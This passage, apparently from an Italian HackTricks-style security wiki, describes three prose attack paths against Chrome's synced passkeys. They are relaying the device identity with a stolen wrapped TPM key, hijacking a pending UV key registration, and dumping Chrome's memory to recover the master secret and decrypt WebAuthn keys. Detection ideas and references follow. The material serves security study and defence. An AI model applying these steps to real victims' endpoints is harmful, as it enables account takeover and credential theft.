Questo significa che **il binding hardware impedisce l’esportazione al di fuori del dispositivo, ma non l’uso da parte dello stesso utente sull’endpoint compromesso**.

### Percorsi pratici di abuso

1. **Pass-ta-key / relay dell’identità del dispositivo**<sup>[[4]](#references)</sup>
   - Enumerare `WebauthnCredentialSpecifics` dal LevelDB di Chrome.
   - Avviare un login con passkey e ottenere una nuova challenge WebAuthn.
   - Usare il blob `wrapped_identity_private_key` sottratto sul TPM della vittima per firmare il binding della richiesta al cloud authenticator.
   - Inoltrare l’assertion restituita alla relying party.
   - Questo è particolarmente utile quando la RP accetta `userVerification=preferred` o non rifiuta le assertion con **`UV=0`**.
2. **Dirottamento di una chiave UV in sospeso**<sup>[[4]](#references)</sup>
   - Forzare una nuova registrazione eliminando `passkey_enclave_state` o inviando un’operazione `device/forget` firmata validamente.
   - Se la registrazione lascia il dispositivo in **`uv_key_pending`**, registrare una chiave pubblica UV controllata dall’attaccante.
   - Se il provider non verifica l’attestation / l’origine dell’hardware sicuro per la nuova chiave UV, le successive firme della chiave dell’attaccante vengono considerate **`UV=1`**.
3. **Furto del master secret / recupero SDS**<sup>[[4]](#references)</sup>
   - Forzare il recupero o la nuova associazione affinché Chrome scarichi il master secret delle passkey sincronizzate.
   - Monitorare la ricreazione/modifica di `passkey_enclave_state`, quindi acquisire un dump della memoria di Chrome mentre il **security domain secret (SDS)** in chiaro è presente.
   - Usare l’SDS recuperato per decifrare i campi cifrati in ogni record `WebauthnCredentialSpecifics` e recuperare le chiavi private WebAuthn portabili.

### Idee per DFIR / rilevamento

- Monitorare l’**eliminazione/ricreazione** di `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Generare un avviso per accessi anomali a **`Sync Data\LevelDB`** di Chrome da parte di processi non browser.
- Generare un avviso per **dump della memoria di Chrome** o accessi sospetti alla memoria tra processi.
- Analizzare le richieste ripetute del **PIN di recupero di Google Password Manager** o le nuove registrazioni impreviste.
- Ricordare che **`signCount`** di WebAuthn spesso non è utile per le passkey sincronizzate, perché può rimanere costante; quindi il rilevamento classico dei cloni è inefficace.



## References

- [1] [Unit 42 – Un’indagine su anni di operazioni non rilevate che hanno preso di mira settori di alto valore](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing con macro Word VBA via SMTP → decrittazione delle credenziali di hMailServer → Veeam CVE-2023-27532 per ottenere SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Dentro Ink Dragon: svelati la rete di relay e il funzionamento interno di un’operazione offensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: una nuova superficie di attacco nell’autenticazione senza password](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / archiviazione delle chiavi CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Come funziona davvero l’archivio dati di Active Directory: dentro NTDS.dit (Parte 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Dump remoto delle password di Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho amplia il proprio arsenale di cyber-spionaggio con il toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Funzione CreateFileW e `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Modalità di backup `/B` di Robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [FAQ di Telegram – chiusura delle sessioni attive](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard e Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: protezione e gestione delle credenziali](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - input supportati e guida rapida](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
